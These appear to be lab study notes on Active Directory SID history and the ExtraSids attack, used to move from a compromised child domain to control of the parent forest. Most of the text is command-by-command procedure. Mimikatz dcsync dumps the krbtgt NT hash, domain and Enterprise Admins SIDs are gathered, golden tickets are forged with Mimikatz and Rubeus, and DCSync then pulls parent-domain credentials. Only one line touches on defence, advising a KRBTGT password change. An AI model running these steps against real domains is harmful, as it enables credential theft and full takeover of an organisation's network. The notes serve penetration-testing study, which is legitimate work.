## SID History Primer
- sidHistory attribute is used in migration scenarios
- if a user in one domain is migrated to another domain, a new account is created in the other domain.
- A new SID is assigned and the previous is added to sidHistory so that the user can access resources from the original domain
- Using Mimikatz, an attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control.
- When logging in with this account, all of the SIDs associated with the account are added to the user's token.
- This token is used to determine what resources the account can access. If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform DCSync and create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001/) or a Kerberos ticket-granting ticket (TGT), which will allow for us to authenticate as any account in the domain of our choosing for further persistence.

<hr>

# ExtraSids Attack - **Mimikatz**
- allows the compromise of a parent domain when the child domain is compromised.
- Within the same AD forest, sidHistory property is respected due to lack of SID Filtering protection.
- SID filtering filters out auth requests from a domain in another forest across a trust
- Child domain compromised. we add an sid of Enterprise Domain ADmins from parent node to sidHistory
	- this will allow access to entire forest.
- ![](/attachments/Pasted-image-20250301174110.png)

## Workflow of this attack:
- `KRBTGT` is the service account for the Key Distribution Center (KDC) in AD
- it encrypts/signs all kerberos tickets granted in that domain.
- this accounts password is used by the DC to decrypt the KRB tickets
- The KRBTGT account is used to create KRBTGT that is used to request TGS for any service on any host in the domain.
- The only way to invalidate a Golden Ticket is to change the password of the KRBTGT account, which should be done periodically and definitely after a penetration test assessment where full domain compromise is reached.
- The child domain - `LOGISTICS.INLANEFREIGHT.LOCAL` | The parent domain - `INLANEFREIGHT.LOCAL`
### Obtain the KRBTGT accounts NT hash using Mimikatz
- RUN **POWERSHELL AS ADMIN**
- `mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt`
	- has NT hash
	- child domain name
	- domain SID
### Get SID of the child domain from PowerView
- `Get-DomainSID`
### Get Enterprise Admins Group SID
**Using PowerView**
- `Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid`

**Using in-built cmdlet**
- `Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"`

![](/attachments/Pasted-image-20250301181046.png)

### Confirm no access to the DC of the parent domain
- `ls \\academy-ea-dc01.inlanefreight.local\c$`
### Create a Golden ticket with Mimikatz
- `mimikatz.exe`
- `kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt`
	- `sid` - child domain sid
	- `sids` - parent domain sid
- `klist` - confirm if `hacker` ticket is in memory
### Confirm access to the DC of the parent domain
- `ls \\academy-ea-dc01.inlanefreight.local\c$`
	- list whole C drive

<hr>

# ExtraSids Attack - **Rubeus**
### Confirm no access to DC of the parent domain
- `ls \\academy-ea-dc01.inlanefreight.local\c$`
### Create a Golden Ticket with Rubeus
- `.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt`
	- `/rc4` - NT hash for the KRBTGT account
	- `/sids` - create golden ticket with same rights of Enterprise Domain Admin
- `klist` - confirm if `hacker` ticket is in memory
### DCSync against the parent domain user
- `.\mimikatz.exe`
- `lsadump::dcsync /user:INLANEFREIGHT\lab_adm`
- `lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL`
	- when target domain not the same as user's domain
